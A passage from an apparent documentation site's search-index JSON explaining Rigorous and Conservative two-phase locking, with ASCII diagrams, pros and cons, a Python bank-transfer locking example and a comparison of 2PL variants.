\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Use Cases:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           RIGOROUS 2PL - USE CASES                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Best for:                                               \u2502\n\u2502 \u2022 Critical financial transactions                       \u2502\n\u2502 \u2022 Audit trail requirements                              \u2502\n\u2502 \u2022 Strict compliance (SOX, HIPAA)                        \u2502\n\u2502 \u2022 Systems where correctness &gt; performance               \u2502\n\u2502 \u2022 Low-contention workloads                              \u2502\n\u2502                                                         \u2502\n\u2502 Examples:                                               \u2502\n\u2502 \u2022 Banking: Wire transfers                               \u2502\n\u2502 \u2022 Healthcare: Medical record updates                    \u2502\n\u2502 \u2022 Legal: Contract modifications                         \u2502\n\u2502 \u2022 Government: Classified data updates                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros and Cons:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       RIGOROUS 2PL - ADVANTAGES &amp; DISADVANTAGES         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ADVANTAGES:                                             \u2502\n\u2502 \u2705 Strongest isolation guarantee                        \u2502\n\u2502 \u2705 Simplest to implement                                \u2502\n\u2502 \u2705 No cascading aborts                                  \u2502\n\u2502 \u2705 No dirty reads                                       \u2502\n\u2502 \u2705 Strict serializability                               \u2502\n\u2502 \u2705 Easy to reason about                                 \u2502\n\u2502                                                         \u2502\n\u2502 DISADVANTAGES:                                          \u2502\n\u2502 \u274c Lowest concurrency                                   \u2502\n\u2502 \u274c Longest lock hold times                              \u2502\n\u2502 \u274c Highest blocking/waiting                             \u2502\n\u2502 \u274c Poor scalability                                     \u2502\n\u2502 \u274c Overkill for many applications                       \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#type-4-conservative-2pl-deadlock-free","title":"Type 4: Conservative 2PL (Deadlock-Free)","text":"<p>Description:</p> <p>Conservative 2PL (also called Static 2PL) requires that transactions declare and acquire ALL locks they need before starting execution. Once execution begins, no additional locks can be acquired. This completely prevents deadlocks but requires knowing all resources in advance.</p> <p>Rules:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          CONSERVATIVE 2PL - RULES                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 PRE-EXECUTION PHASE:                                    \u2502\n\u2502 \u2022 Declare ALL resources needed                          \u2502\n\u2502 \u2022 Acquire ALL locks at once (atomically)                \u2502\n\u2502 \u2022 If any lock unavailable \u2192 WAIT                        \u2502\n\u2502 \u2022 Only proceed when ALL acquired                        \u2502\n\u2502                                                         \u2502\n\u2502 EXECUTION PHASE:                                        \u2502\n\u2502 \u2022 Execute transaction logic                             \u2502\n\u2502 \u2022 Use already-held locks                                \u2502\n\u2502 \u2022 NO new locks can be acquired                          \u2502\n\u2502 \u2022 Can release locks if done                             \u2502\n\u2502                                                         \u2502\n\u2502 POST-EXECUTION:                                         \u2502\n\u2502 \u2022 Release all locks at commit/abort                     \u2502\n\u2502                                                         \u2502\n\u2502 KEY RULE:                                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 ALL LOCKS acquired BEFORE execution      \u2502           \u2502\n\u2502 \u2502 No locks acquired DURING execution       \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Timeline Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        CONSERVATIVE 2PL - TIMELINE                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Locks                                                  \u2502\n\u2502  Held                                                   \u2502\n\u2502   \u25b2                                                     \u2502\n\u2502   \u2502                                                     \u2502\n\u2502 3 \u2502    \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                   \u2502\n\u2502   \u2502    \u2502\u2190 All locks acquired upfront\u2502                   \u2502\n\u2502 2 \u2502    \u2502                             \u2502                   \u2502\n\u2502   \u2502    \u2502  Execution happens here     \u2502                   \u2502\n\u2502 1 \u2502    \u2502  (no new locks needed)      \u2502                   \u2502\n\u2502   \u2502    \u2502                             \u2502                   \u2502\n\u2502 0 \u2502\u2500\u2500\u2500\u2500\u25cf                             \u25cf\u2500\u2500\u2192                \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Time         \u2502\n\u2502     BEGIN \u2502                         COMMIT              \u2502\n\u2502           \u2502                                             \u2502\n\u2502        Acquire ALL                                      \u2502\n\u2502        locks atomically                                 \u2502\n\u2502        (may wait here)                                  \u2502\n\u2502                                                         \u2502\n\u2502   \u251c\u2500LOCK\u2500\u2524\u2500\u2500\u2500\u2500\u2500\u2500 EXECUTE \u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2500RELEASE\u2500\u2524             \u2502\n\u2502     ALL                          ALL                    \u2502\n\u2502                                                         \u2502\n\u2502   Key difference: Lock acquisition is INSTANTANEOUS     \u2502\n\u2502   (all at once) or transaction WAITS                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Why Deadlock-Free:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      CONSERVATIVE 2PL - DEADLOCK PREVENTION             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Deadlock requires HOLD-AND-WAIT:                        \u2502\n\u2502 \u2022 T1 holds A, waits for B                               \u2502\n\u2502 \u2022 T2 holds B, waits for A                               \u2502\n\u2502                                                         \u2502\n\u2502 Conservative 2PL breaks this:                           \u2502\n\u2502                                                         \u2502\n\u2502 T1: Request [A, B]                                      \u2502\n\u2502     \u2192 Either gets BOTH or NEITHER                       \u2502\n\u2502     \u2192 No partial acquisition                            \u2502\n\u2502                                                         \u2502\n\u2502 T2: Request [B, A]                                      \u2502\n\u2502     \u2192 Either gets BOTH or NEITHER                       \u2502\n\u2502     \u2192 One will wait, one will proceed                   \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                    \u2502\n\u2502 T1: Request A, B                                        \u2502\n\u2502     \u2192 Gets both \u2713                                       \u2502\n\u2502     Executes...                                         \u2502\n\u2502                                                         \u2502\n\u2502 T2: Request B, A                                        \u2502\n\u2502     \u2192 WAITS (T1 holds them)                             \u2502\n\u2502                                                         \u2502\n\u2502 T1: Completes, releases A, B                            \u2502\n\u2502                                                         \u2502\n\u2502 T2: \u2192 Gets both \u2713                                       \u2502\n\u2502     Executes...                                         \u2502\n\u2502                                                         \u2502\n\u2502 NO DEADLOCK POSSIBLE! \u2705                                \u2502\n\u2502 (Because no hold-and-wait)                              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Implementation Example:</p> <pre><code>class ConservativeTwoPhaseLocking:\n    \"\"\"\n    Conservative 2PL: Acquire all locks before execution\n    \"\"\"\n\n    def transfer_conservative(self, from_acc, to_acc, amount):\n        # STEP 1: Declare all resources needed\n        required_locks = {from_acc, to_acc}\n\n        print(f\"Declaring needed resources: {required_locks}\")\n\n        # STEP 2: Acquire ALL locks atomically\n        print(\"Attempting to acquire ALL locks...\")\n        acquired = self.acquire_all_locks_atomic(required_locks)\n\n        if not acquired:\n            print(\"Could not acquire all locks, waiting...\")\n            # Wait and retry\n            time.sleep(0.1)\n            return self.transfer_conservative(from_acc, to_acc, amount)\n\n        print(\"\u2713 All locks acquired! Starting execution...\")\n\n        try:\n            # STEP 3: Execute (no new locks needed)\n            balance_from = self.read(from_acc)\n            balance_to = self.read(to_acc)\n\n            if balance_from &lt; amount:\n                raise ValueError(\"Insufficient funds\")\n\n            self.write(from_acc, balance_from - amount)\n            self.write(to_acc, balance_to + amount)\n\n            # STEP 4: Commit and release ALL locks\n            self.commit()\n            self.release_all_locks(required_locks)\n            print(\"\u2713 Transaction complete, all locks released\")\n\n        except Exception as e:\n            self.rollback()\n            self.release_all_locks(required_locks)\n            print(f\"\u2717 Transaction failed: {e}\")\n\n    def acquire_all_locks_atomic(self, locks):\n        \"\"\"\n        Try to acquire all locks atomically\n        Returns True if all acquired, False otherwise\n        \"\"\"\n        # Sort locks to prevent deadlock (even though not needed)\n        sorted_locks = sorted(locks)\n        acquired = []\n\n        for lock in sorted_locks:\n            if self.try_lock(lock):\n                acquired.append(lock)\n            else:\n                # Failed to get one lock, release all acquired\n                for l in acquired:\n                    self.unlock(l)\n                return False\n\n        # All acquired!\n        return True\n</code></pre> <p>Use Cases:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         CONSERVATIVE 2PL - USE CASES                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Best for:                                               \u2502\n\u2502 \u2022 Transactions with known, fixed resource set           \u2502\n\u2502 \u2022 Batch processing (resources known in advance)         \u2502\n\u2502 \u2022 Systems where deadlocks are unacceptable              \u2502\n\u2502 \u2022 Real-time systems (predictable behavior)              \u2502\n\u2502                                                         \u2502\n\u2502 Examples:                                               \u2502\n\u2502 \u2022 Batch reports (read all accounts)                     \u2502\n\u2502 \u2022 End-of-day processing                                 \u2502\n\u2502 \u2022 Scheduled maintenance tasks                           \u2502\n\u2502 \u2022 Data migration jobs                                   \u2502\n\u2502                                                         \u2502\n\u2502 NOT suitable for:                                       \u2502\n\u2502 \u2022 Interactive transactions (resource set unknown)       \u2502\n\u2502 \u2022 Dynamic queries (joins, filters)                      \u2502\n\u2502 \u2022 Exploratory data analysis                             \u2502\n\u2502 \u2022 User-driven workflows                                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros and Cons:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      CONSERVATIVE 2PL - ADVANTAGES &amp; DISADVANTAGES      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ADVANTAGES:                                             \u2502\n\u2502 \u2705 Deadlock-free (no hold-and-wait)                     \u2502\n\u2502 \u2705 Predictable execution                                \u2502\n\u2502 \u2705 No deadlock detection needed                         \u2502\n\u2502 \u2705 Simpler deadlock handling                            \u2502\n\u2502 \u2705 Good for batch processing                            \u2502\n\u2502                                                         \u2502\n\u2502 DISADVANTAGES:                                          \u2502\n\u2502 \u274c Requires knowing all resources upfront               \u2502\n\u2502 \u274c Not suitable for interactive transactions            \u2502\n\u2502 \u274c Lower concurrency (all-or-nothing locking)           \u2502\n\u2502 \u274c May lock more than needed                            \u2502\n\u2502 \u274c Long initial wait time                               \u2502\n\u2502 \u274c Resource declaration overhead                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#comparison-of-all-2pl-types","title":"Comparison of All 2PL Types","text":"<p>Side-by-Side Comparison:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              COMPARISON OF ALL 2PL TYPES                                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                              \u2502\n\u2502 Feature          \u2502Basic 2PL\u2502Strict 2PL\u2502Rigorous 2PL\u2502Conservative 2PL       \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500     \u2502\n\u2502 Serializability  \u2502   \u2705    \u2502    \u2705    \u2502     \u2705     \u2502      \u2705               \u2502\n\u2502 Cascading Aborts \u2502   \u274c    \u2502    \u2705    \u2502     \u2705     \u2502      \u2705               \u2502\n\u2502 Dirty Reads      \u2502   \u274c    \u2502    \u2705    \u2502     \u2705     \u2502      \u2705               \u2502\n\u2502 Deadlock-Free    \u2502   \u274c    \u2502    \u274c    \u2502     \u274c     \u2502      \u2705               \u2502\n\u2502 Concurrency      \u2502  High   \u2502  Medium  \u2502    Low     \u2502    Medium             \u2502\n\u2502 Lock Hold Time   \u2502  Short  \u2502  Medium  \u2502    Long    \u2502    Long               \u2502\n\u2502 Implementation   \u2502 Complex \u2502  Medium  \u2502   Simple   \u2502    Complex            \u2502\n\u2502 Recovery         \u2502 Complex \u2502  Simple  \u2502   Simple   \u2502    Simple             \u2502\n\u2502 Real-World Use   \u2502  Rare   \u2502  Common  \u2502    Rare    \u2502    Rare               \u2502\n\u2502                                                                              \u2502\n\u2502 WHEN LOCKS RELEASED:                                                         \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                       \u2502\n\u2502 Shared locks     \u2502 During  \u2502  During  \u2502  At commit \u2502   At commit           \u2502\n\u2502 Exclusive locks  \u2502 During  \u2502At commit \u2502  At commit \u2502   At commit           \u2502\n\u2502                                                                              \u2502\n\u2502 IDEAL FOR:                                                                   \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                       \u2502\n\u2502 Basic 2PL        \u2502 Maximum concurrency (theoretical)                        \u2502\n\u2502 Strict 2PL       \u2502 Production databases (best balance) \u2b50                   \u2502\n\u2502 Rigorous 2PL     \u2502 Critical transactions (safety first)                     \u2502\n\u2502 Conservative 2PL \u2502 Batch jobs with known resources                          \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Comparison - Lock Timelines:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       LOCK TIMELINES - ALL 2PL TYPES                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 BASIC 2PL:                                              \u2502\n\u2502   \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                                              \u2502\n\u2502   \u2502      \u2572                                              \u2502\n\u2502   \u2502       \u25cf\u2500\u2500\u2500\u2500\u2500\u25cf                                       \u2502\n\u2502   BEGIN   \u2502     COMMIT                                  \u2502\n\u2502         Release                                         \u2502\n\u2502         locks early                                     \u2502\n\u2502                                                         \u2502\n\u2502 STRICT 2PL:                                             \u2502\n\u2502   \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf  (Exclusive)                         \u2502\n\u2502   \u2502      \u25cf\u2500\u2500\u2500\u25cf   \u2502  (Shared)                            \u2502\n\u2502   BEGIN  \u2502   COMMIT                                     \u2502\n\u2502         Release                                         \u2502\n\u2502         shared early                                    \u2502\n\u2502                                                         \u2502\n\u2502 RIGOROUS 2PL:                                           \u2502\n\u2502   \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                                      \u2502\n\u2502   \u2502              \u2502  (All locks)                         \u2502\n\u2502   BEGIN        COMMIT                                   \u2502\n\u2502                                                         \u2502\n\u2502 CONSERVATIVE 2PL:                                       \u2502\n\u2502   